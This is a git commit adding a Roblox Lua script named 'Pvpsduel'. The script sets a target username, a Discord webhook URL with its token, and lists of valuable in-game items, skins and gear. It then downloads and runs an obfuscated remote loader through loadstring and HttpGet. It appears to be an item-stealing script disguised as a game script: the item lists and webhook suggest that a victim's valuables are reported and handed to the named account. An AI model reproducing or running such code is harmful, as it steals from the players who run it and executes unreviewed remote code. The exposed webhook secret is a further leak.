f71f17b55fe01ed52804e977966498d60ca2a811
sab-api <carlosignaa2019@gmail.com>
2026-08-15 05:33:32 -0400

    Add script Pvpsduel_1786786412264.lua

---
+++ scripts/Pvpsduel_1786786412264.lua
@@ -0,0 +1,69 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "Kekdkdldlldl"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1538117582757036112/xGWwlZ7IHRpJf64_tVkgqoT_Zver7molQs3CuBsNkj_zfhJG2ATLi6lAEEyx3zoKGKiP"
+getgenv().NORMAL_BRAINROTS = {
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Duggy Bros"] = true,
+    ["Garama and Madundung"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Los Chillis"] = true,
+    ["Las Sis"] = true,
+    ["Los Bros"] = true,
+    ["Los Primos"] = true,
+    ["Los Spaghettis"] = true,
+    ["Orcaledon"] = true,
+    ["Tictac Sahur"] = true,
+    ["Tralaledon"] = true,
+    ["Los Tangcitos"] = true,
+    ["Los Tictacs"] = true,
+    ["Los Secret Combinasionas"] = true
+}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Candy Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()
+end)
